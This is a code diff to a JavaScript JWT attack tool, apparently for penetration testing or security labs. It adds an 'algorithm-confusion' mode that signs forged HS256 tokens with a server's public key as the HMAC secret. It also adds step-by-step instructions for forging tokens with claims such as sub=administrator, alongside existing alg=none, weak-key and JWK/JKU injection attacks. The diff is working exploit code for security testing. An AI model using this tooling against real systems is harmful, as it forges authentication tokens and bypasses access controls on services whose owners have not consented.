@@ -80,6 +80,20 @@ async function generateJwkAttackToken(forceJwkSign) {
       notes = ['alg=none candidate generated.'];
     }
 
+
+    if (selectedAttack === 'algorithm-confusion') {
+      const keyInput = requireInput('Provide server public key as Base64 PEM or raw PEM text.');
+      const keyBytes = parseAlgorithmConfusionKey(keyInput);
+      nextHeader.alg = 'HS256';
+      delete nextHeader.jwk;
+      delete nextHeader.jku;
+      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+      nextSig = await hmacSignBase64urlBytes(signingInput, keyBytes, 'SHA-256');
+      resultToken.value = `${signingInput}.${nextSig}`;
+      attackNotes.textContent = 'Algorithm confusion candidate generated (header alg=HS256; signed with supplied public-key material as HMAC secret).';
+      return;
+    }
+
     if (selectedAttack === 'weak-signing-key') {
       const secret = requireInput('Please enter signing key/secret.');
       nextHeader.alg = 'HS256';
@@ -183,6 +197,8 @@ function configureInputForAttack(key) {
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
 
+  if (key === 'algorithm-confusion') return showInput('Public key material', 'Base64 PEM or -----BEGIN PUBLIC KEY-----', 'Paste server public key as Base64 PEM (or raw PEM) to use as HS256 secret.');
+
   if (key === 'jwk-header-injection') {
     showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject. Generate key by selected alg below.');
     jwkTools.classList.remove('hidden');
@@ -265,6 +281,17 @@ function getAttackSteps(key) {
     ].join('\n');
   }
 
+  if (key === 'algorithm-confusion') {
+    return [
+      '1) Obtain server public key (from JWKS or PEM source).',
+      '2) Convert/copy public key as Base64 PEM (or keep raw PEM).',
+      '3) Paste key material into Attack-specific input.',
+      '4) Set payload claims as needed (for example sub=administrator).',
+      '5) Click Generate to produce HS256 token signed with provided key material.',
+      '6) Send request with generated token and validate behavior.',
+    ].join('\n');
+  }
+
   if (key === 'weak-signing-key') {
     return [
       '1) Paste source JWT and click Decode token.',
@@ -293,6 +320,7 @@ function getPresetHint(key) {
   const hints = {
     'unverified-signature': 'Generates token with invalid signature.',
     'flawed-signature': 'Generates alg=none token with empty signature.',
+    'algorithm-confusion': 'Uses public-key material as HS256 secret.',
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
@@ -449,6 +477,23 @@ function randomSecret(length) {
   return out;
 }
 
+
+
+function parseAlgorithmConfusionKey(input) {
+  const value = input.trim();
+  if (value.includes('BEGIN PUBLIC KEY') || value.includes('BEGIN RSA PUBLIC KEY')) {
+    return new TextEncoder().encode(value);
+  }
+  return base64ToBytes(value);
+}
+
+function base64ToBytes(b64) {
+  const normalized = base64urlToBase64(b64);
+  const binary = atob(normalized);
+  const out = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i += 1) out[i] = binary.charCodeAt(i);
+  return out;
+}
 
 async function hmacSignBase64urlBytes(message, keyBytes, hash) {
   const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash }, false, ['sign']);
